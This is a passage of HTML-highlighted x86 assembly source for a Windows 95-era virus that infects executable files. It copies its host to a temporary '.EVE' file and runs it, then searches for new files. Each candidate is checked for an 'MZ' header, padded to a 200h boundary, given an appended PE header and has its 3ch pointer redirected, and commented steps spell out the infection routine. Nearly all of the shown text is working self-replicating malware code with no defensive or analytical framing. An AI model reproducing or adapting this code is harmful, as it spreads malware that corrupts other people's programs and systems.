       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">GetLine</span><span class="sc0"> 
 
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Now make the file name into something we can use</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;pnter to the current file name</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempfile</span><span class="sc0"> 

</span><span class="sc5">TempFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">TempFile</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">;MOV     EAX,004D4F43H    ;00'MOC'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00455645h</span><span class="sc0">  </span><span class="sc1">;00'EVE'</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;the host file</span><span class="sc0">
        
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Copy the file to another name</span><span class="sc0">
       </span><span class="sc6">Call</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Copy</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempfile</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">False</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ErrorFile</span><span class="sc0"> 
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Open the File r/w using Create file</span><span class="sc0">

</span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Create</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempfile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> \
                        </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Move Pointer to the 3ch and fix the pointer to old PE file</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;for debuggin</span><span class="sc0">
</span><span class="sc1">;        pusha</span><span class="sc0">
</span><span class="sc1">;        mov     edi,dword ptr [OldOff]</span><span class="sc0">
</span><span class="sc1">;        call    ConvertIt</span><span class="sc0">
</span><span class="sc1">;        Call    dword ptr [MsgBox] , large 0, offset tempfile , offset numb</span><span class="sc0">
</span><span class="sc1">;                                   ,large 1</span><span class="sc0">
</span><span class="sc1">;        popa</span><span class="sc0">
</span><span class="sc1">;end for debuggin</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Write to the file using Write</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Write</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldOff</span><span class="sc4">,</span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0">  \
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Close the file</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">Close</span><span class="sc4">],[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Run the file using CreateProcess</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">createp</span><span class="sc4">],</span><span class="sc0">             \
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempfile</span><span class="sc4">,</span><span class="sc0"> \   </span><span class="sc1">;module name</span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">blank</span><span class="sc4">,</span><span class="sc0"> \   </span><span class="sc1">;command line</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">        \   </span><span class="sc1">;sec attr</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">        \   </span><span class="sc1">;thread sec</span><span class="sc0">
                                </span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc5">False</span><span class="sc4">,</span><span class="sc0">    \   </span><span class="sc1">;inherit handles</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">        \   </span><span class="sc1">;create flags</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">        \   </span><span class="sc1">;Enviroment</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">        \   </span><span class="sc1">;current directory</span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">StartupInfo</span><span class="sc4">,</span><span class="sc0">        \   </span><span class="sc1">;startup info</span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInfo</span><span class="sc0"> \   </span><span class="sc1">;process info</span><span class="sc0">

         
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Run the file using Winexec</span><span class="sc0">
</span><span class="sc1">;        Call    dword ptr [WinEx], offset tempfile, large 1</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Call    dword ptr[Close],EAX</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Now try to infect a new file</span><span class="sc0">
</span><span class="sc1">;1 find file</span><span class="sc0">
</span><span class="sc1">;2 open the file</span><span class="sc0">
</span><span class="sc1">;3 make sure its a even 200h boundary alter if needed</span><span class="sc0">
</span><span class="sc1">;4 modifiy the ptr to raw data in the .Code section</span><span class="sc0">
</span><span class="sc1">;  write the new end to the file</span><span class="sc0">
</span><span class="sc1">;5 goto top of file then modify 3ch offset to point to the new location</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;1 First find a file</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirst</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewHost</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ErrorFile</span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfindFile</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GotOne</span><span class="sc0">

</span><span class="sc5">CloseFileTry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">Close</span><span class="sc4">],[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">tryfornext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNext</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfindFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">  
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">GotOne</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">CloseFind</span><span class="sc4">],[</span><span class="sc5">hfindFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ErrorFile</span><span class="sc0">

</span><span class="sc5">GotOne</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Open the File r/w using Create file</span><span class="sc0">

</span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Create</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc4">,</span><span class="sc0"> \
                     </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">tryfornext</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get the file size and figure if we need to round it up to a 200h offset</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CloseFileTry</span><span class="sc0"> 

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">SizeOfFile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CodePtrRwData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;holds the new file size </span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Read from the  </span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Read</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">         \
                          </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">       \ </span><span class="sc1">;handle</span><span class="sc0">
                          </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">,</span><span class="sc0">   \ </span><span class="sc1">;where to read to</span><span class="sc0">
                          </span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc0">            \ </span><span class="sc1">;how much to read</span><span class="sc0">
                          </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">,</span><span class="sc0">  \ </span><span class="sc1">;how much was read</span><span class="sc0">
                          </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;overlapped amount not used win95</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">CloseFileTry</span><span class="sc0">
         
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseFileTry</span><span class="sc0">               </span><span class="sc1">;Get next file</span><span class="sc0">

 
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CloseFileTry</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">CloseFileTry</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldOff</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Move Pointer to the endf of the file </span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
                                                 </span><span class="sc1">; file end</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get how many bytes to add to the file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CodePtrRwData</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; holds what the new file size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Write that many bytes to the end of the file</span><span class="sc0">
</span><span class="sc1">;Write to the file using Write</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Write</span><span class="sc4">],</span><span class="sc0">      \
                        </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">      \       </span><span class="sc1">;file handle </span><span class="sc0">
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldOff</span><span class="sc4">,</span><span class="sc0">  \       </span><span class="sc1">;where to write from</span><span class="sc0">
                        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0">            \       </span><span class="sc1">;how many to write</span><span class="sc0">
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">,</span><span class="sc0"> \       </span><span class="sc1">;how many bytes were writen</span><span class="sc0">
                        </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;overlapped not used in win95</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Write to the file using Write</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Write</span><span class="sc4">],</span><span class="sc0">        \
                        </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">        \       </span><span class="sc1">;file handle </span><span class="sc0">
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">,</span><span class="sc0">  \       </span><span class="sc1">;where to write from</span><span class="sc0">
                        </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">,</span><span class="sc0">              \       </span><span class="sc1">;how many to write</span><span class="sc0">
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">,</span><span class="sc0">   \       </span><span class="sc1">;how many bytes were writen</span><span class="sc0">
                        </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;overlapped not used in win95</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Move Pointer to the TOPF of the file </span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">   
</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Write the new offset at 3ch </span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Write</span><span class="sc4">],</span><span class="sc0">        \
                        </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">        \       </span><span class="sc1">;file handle </span><span class="sc0">
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CodePtrRwData</span><span class="sc4">,</span><span class="sc0">  \       </span><span class="sc1">;where to write from</span><span class="sc0">
                        </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">              \       </span><span class="sc1">;how many to write</span><span class="sc0">
                        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">,</span><span class="sc0">   \       </span><span class="sc1">;how many bytes were writen</span><span class="sc0">
                        </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;overlapped not used in win95</span><span class="sc0">

</span><span class="sc1">;--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;close the file</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">Close</span><span class="sc4">],[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;Call  dword ptr [MsgBox] , large 0,offset tempfile, offset filename ,large 1</span><span class="sc0">

</span><span class="sc5">ErrorFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">K32ExitP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">API_LOC2</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
      

</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Beep</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">beep</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;ConvertIt takes a number in Edi and Converts it to Readable and Stores it</span><span class="sc0">
</span><span class="sc1">; in the location Pointed  at by Esi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Input</span><span class="sc0">
</span><span class="sc1">;Edi    What number we want to convert to hexdecial readable</span><span class="sc0">
</span><span class="sc1">;Esi    Where it will be placed When Done</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ConvertIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">numb</span><span class="sc0">
        </span><span class="sc6">PushA</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc8">Esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">


</span><span class="sc5">digit_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">
        
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Cl</span><span class="sc0">
